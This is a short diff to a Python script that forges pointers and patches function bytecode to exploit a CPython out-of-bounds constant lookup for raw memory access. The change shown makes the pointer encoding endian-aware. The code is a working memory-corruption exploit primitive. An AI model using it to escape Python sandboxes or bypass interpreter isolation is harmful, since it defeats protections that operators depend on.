@@ -21,10 +21,11 @@ TUPLE_HEADER = sizeof(())
 BYTES_HEADER = sizeof(b'') - 1
 PTR_SIZE = sizeof((0,)) - TUPLE_HEADER
 MAX_INT =  (1 << PTR_SIZE * 8 - 1) - 1
+ENDIAN = ['little','big'][1%memoryview(b'\1\0').cast('h')[0]]
 
 def load_addr(addr):
     magic = lambda:None # this functions bytecode gets patched
-    b_addr = addr.to_bytes(PTR_SIZE, 'little') # convert int to bytes (bytes values are held raw in memory)
+    b_addr = addr.to_bytes(PTR_SIZE, ENDIAN) # convert int to bytes (bytes values are held raw in memory)
     offset = id(b_addr) + BYTES_HEADER # start of raw addr in memory
     offset -= id(magic.__code__.co_consts) + TUPLE_HEADER # get distance from start of `co_consts tuple`
     offset //= PTR_SIZE # offset has to be evenly dividable by `PTR_SIZE` as `PyTuple_GET_ITEM` indexes by `PTR_SIZE`
@@ -43,7 +44,7 @@ def load_addr(addr):
     return magic() # trigger the bug
 
 def make_getmem():
-    memory_backing = b''.join(n.to_bytes(PTR_SIZE, 'little') for n in (
+    memory_backing = b''.join(n.to_bytes(PTR_SIZE, ENDIAN) for n in (
         1,
         id(bytearray),
         MAX_INT,
